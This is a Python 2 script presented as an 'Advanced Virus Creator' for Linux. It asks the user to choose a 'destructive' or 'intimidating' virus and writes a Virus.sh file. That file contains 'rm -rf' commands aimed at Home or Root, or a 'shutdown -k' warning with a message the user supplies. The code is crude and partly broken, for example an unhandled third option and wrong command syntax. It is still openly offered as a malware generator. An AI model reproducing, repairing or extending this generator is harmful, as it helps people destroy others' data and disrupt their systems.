import os
import time
print"""                                                           
              A:::A  V::::::V           V::::::V   CCC::::::::::::C
             A:::::A V::::::V           V::::::V CC:::::::::::::::C
            A:::::::AV::::::V           V::::::VC:::::CCCCCCCC::::C
           A:::::::::AV:::::V           V:::::VC:::::C       CCCCCC
          A:::::A:::::AV:::::V         V:::::VC:::::C              
         A:::::A A:::::AV:::::V       V:::::V C:::::C              
        A:::::A   A:::::AV:::::V     V:::::V  C:::::C              
       A:::::A     A:::::AV:::::V   V:::::V   C:::::C              
      A:::::AAAAAAAAA:::::AV:::::V V:::::V    C:::::C              
     A:::::::::::::::::::::AV:::::V:::::V     C:::::C              
    A:::::AAAAAAAAAAAAA:::::AV:::::::::V       C:::::C       CCCCCC
   A:::::A             A:::::AV:::::::V         C:::::CCCCCCCC::::C
  A:::::A               A:::::AV:::::V           CC:::::::::::::::C
+------------------------------------------------------------------+
+ ADVANCED                   VIRUS                CREATOR          +
+ By El Sonador                                                    +
+ For linux sh files                                               +
+ V 1.0                                                            +
+------------------------------------------------------------------+
"""
#message=1 means virus with message
#message=2 means virus without message
def D_create_virus(parameter,message,text):
    if parameter == 1:
        if message == 1:
            D_Virus = open("Virus.sh", "wb")
            D_Virus.write("Echo " + text + os.linesep + "sleep -s 5" + os.linesep + "rm -rf Home");
            D_Virus.close()
            print "Successfully built.Press enter for exit"
            time.sleep(5) 
        if message == 2:
            D_Virus = open("Virus.sh", "wb")
            D_Virus.write("rm -rf Home");
            D_Virus.close()
            print "Successfully built.Press enter for exit"
            time.sleep(5)
    if parameter == 2:
        if message == 1:
            D_Virus = open("Virus.sh", "wb")
            D_Virus.write("Echo " + text + os.linesep + "sleep -s 5" + os.linesep + "rm -rf Root");
            D_Virus.close()
            print "Successfully built.Press enter for exit"
            time.sleep(5) 
        if message ==2:
            D_Virus = open("Virus.sh", "wb")
            D_Virus.write("rm -rf Root");
            D_Virus.close()
            print "Successfully built.Press enter for exit"
            time.sleep(5)
def I_create_virus(text):
    I_Virus = open("Virus.sh", "wb")
    I_Virus.write("shutdown -k " + text)
    I_Virus.close()
    print "Successfully built.Press enter for exit"
    time.sleep(5) 
print "+-----Choices--------------------------->"
print "What kind of virus you going to create? >"
print "+--------------------------------------->"
print "1)Destructive virus                     >"
print "2)Intimidating virus                    >"
print "+--------------------------------------->"
kind = input("What is your choice?? ~ ")
if kind == 1:
    print "+----------------------------+"
    print "1)Del all documents          +"
    print "2)Del Root                   +"
    print "+----------------------------+"
    chvalue = input ("What is your choice?? ~ ")
    if chvalue == 1:
        print "+--------------------------------------+"
        print "Do you want any messages in virus??  +"
        print "1)Yes                                  +"
        print "2)No                                   +"
        print "+--------------------------------------+"
        chvalue2 = input ("What is your choice?? ~ ")
        if chvalue2 == 1:
            text = raw_input("Enter your message (within double quotes) ~ ")
            D_create_virus(1,1,text)
        if chvalue2 == 2:
            D_create_virus(1,2,"")
    if chvalue == 2:
        print "+--------------------------------------+"
        print "Do you want any messages in virus??  +"
        print "1)Yes                                  +"
        print "2)No                                   +"
        print "+--------------------------------------+"
        chvalue3 = input("What is your choice")
        if chvalue3 == 1:
                text = raw_input("Enter your message (within double quotes) ~ ")
                D_create_virus(2,1,text)
        if chvalue3 == 2:
                D_create_virus(2,2,"")
    if chvalue == 3:
        print "+----------------------------------------------+"
        print "This is the most Dangerous virus....Be careful +"
        print "+----------------------------------------------+"
        print "Do you want message in virus??       +"
        print "1)Yes                                +"
        print "2)No                                 +"
        print "+------------------------------------+"
        chvalue4 = input("What is your choice?? ~ ")
        if chvalue4 == 1:
            text = raw_input("Enter the message(within double quotes) ~ ")
            D_create_virus(3,1,text)
        if chvalue4 == 2:
            D_create_virus(3,2,"")
if kind == 2:
    print "+---------------------------------+"
    print "1)Message and shutdown only virus +"
    print "+---------------------------------+"
    ch2value = input ("What is your choice?? ~")
    if ch2value == 1:
        text = raw_input("Enter the message  ~ ")
        I_create_virus(text)

